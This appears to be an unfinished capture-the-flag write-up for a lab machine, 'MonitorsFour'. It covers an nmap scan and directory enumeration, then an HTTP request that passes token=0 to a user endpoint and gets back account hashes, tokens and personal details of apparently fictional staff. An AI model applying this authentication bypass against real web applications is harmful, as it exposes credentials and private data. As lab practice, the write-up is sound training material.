MonitorsFour

IP : 10.129.6.45

##Nmap Scan
```
sudo nmap -p- 10.129.1.20 -sC -sV -T4 --min-rate=1000 -oN nmap.txt

tarting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-27 04:01 CST
Stats: 0:02:40 elapsed; 1 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 47.25% done; ETC: 04:07 (0:02:55 remaining)
Stats: 0:05:15 elapsed; 1 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 82.44% done; ETC: 04:08 (0:01:06 remaining)
Nmap scan report for monitorsfour.htb (10.129.6.45)
Host is up (0.26s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MonitorsFour - Networking Solutions
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (87%)
Aggressive OS guesses: Microsoft Windows Server 2022 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   338.13 ms 10.10.16.1
2   338.19 ms monitorsfour.htb (10.129.6.45)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (1 host up) scanned in 394.48 seconds
 
```
Dirsearch 
```

/.hta                 (Status: 403) [Size: 146]
/.htaccess            (Status: 403) [Size: 146]
/.htpasswd            (Status: 403) [Size: 146]
/contact              (Status: 200) [Size: 367]
/controllers          (Status: 301) [Size: 162] [--> http://monitorsfour.htb/controllers/]
/forgot-password      (Status: 200) [Size: 3099]
/login                (Status: 200) [Size: 4340]
/static               (Status: 301) [Size: 162] [--> http://monitorsfour.htb/static/]
/user                 (Status: 200) [Size: 35]
/views                (Status: 301) [Size: 162] [--> http://monitorsfour.htb/views/]
```
SubDomain

Looking into the http://monitorsfour.htb/user , it found the token is require 

Got the Admin login info 
```
GET /user?token=0 HTTP/1.1
Host: monitorsfour.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=b7407b4de3be9f03d84a1c504bfc757e
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
Content-Length: 0

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 27 Feb 2026 10:16:43 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/8.3.27
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 1113

[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]


```


